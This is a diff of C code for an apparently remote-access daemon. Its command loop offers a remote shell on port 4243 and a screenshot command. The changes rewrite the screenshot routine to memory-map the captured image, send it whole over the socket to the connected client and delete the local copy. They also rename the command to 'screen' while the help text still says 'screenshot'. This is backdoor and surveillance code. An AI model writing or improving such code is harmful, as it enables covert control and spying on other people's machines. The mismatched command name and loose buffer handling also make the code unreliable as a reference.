@@ -114,6 +114,7 @@ static void	spawn_shell(t_users *users, char **envp)
 	}
 	exit(0);
 }
+#include <sys/mman.h>
 
 static void	screenshot(t_users *users, char **envp)
 {
@@ -123,7 +124,7 @@ static void	screenshot(t_users *users, char **envp)
 	int			status;
 	int			fd = 0;
 	struct stat	st;
-	size_t		img_size = 0;
+	/*size_t		img_size = 0;*/
 	ssize_t		ret_read = 0;
 
 	int ret;
@@ -146,17 +147,17 @@ static void	screenshot(t_users *users, char **envp)
 		perror("open");
 	if (stat("/tmp/test1.png", &st) == -1)
 		perror("stat");
-	img_size = (size_t)st.st_size;
-	while (img_size > 0)
+	/*img_size = (size_t)st.st_size;*/
+	sprintf(img, "%zu", st.st_size);
+	send(users->sd, &img, strlen(img), 0);
+	char *map = mmap(0, st.st_size, PROT_READ, MAP_SHARED, fd, 0);
+	if (map == MAP_FAILED)
 	{
-		if ((ret_read = read(fd, &img, 4096)) == -1)
-			perror("read");
-		else
-			send(users->sd, &img, (size_t)ret_read, 0);
-		img_size -= (size_t)ret_read;
-		memset(&img, 0, sizeof(img));
+		perror("mmap");
+		exit(0);
 	}
-	send(users->sd, "finish", 6, 0);
+	printf("real size  = %zu\n", st.st_size);
+	send(users->sd, map, (size_t)st.st_size, 0);
 	unlink("/tmp/test1.png");
 }
 
@@ -238,7 +239,7 @@ bool	run_daemon(t_connexion *connexion, char **envp)
 						}
 						if (!strcmp(buffer, "?"))
 							send(users.sd, "\n'shell'\tSpawn remote shell on 4243\n'screenshot'	take screenshot\n> ", 66, 0);
-						else if (!strcmp(buffer, "screenshot"))
+						else if (!strcmp(buffer, "screen"))
 							screenshot(&users, envp);
 						else if (!strcmp(buffer, "shell"))
 							spawn_shell(&users, envp);
